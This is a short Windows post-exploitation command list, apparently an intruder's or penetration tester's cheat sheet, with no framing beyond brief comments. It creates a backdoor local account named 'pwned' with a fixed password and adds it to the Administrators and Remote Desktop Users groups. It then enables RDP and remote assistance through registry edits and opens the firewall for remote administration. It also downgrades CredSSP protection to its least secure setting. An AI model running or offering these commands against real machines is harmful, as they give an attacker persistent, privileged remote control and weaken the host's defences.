# user add
shell net user pwned Sup3rS3cr3tL335P@ssw0rt! /y /add
shell net localgroup "remote desktop users" pwned /y /add
shell net localgroup administrators pwned /y /add

# RDP enable
net start termservice
# RDP allow
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
# CredSSP Disable     
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" /v AllowEncryptionOracle /t REG_DWORD /d 2
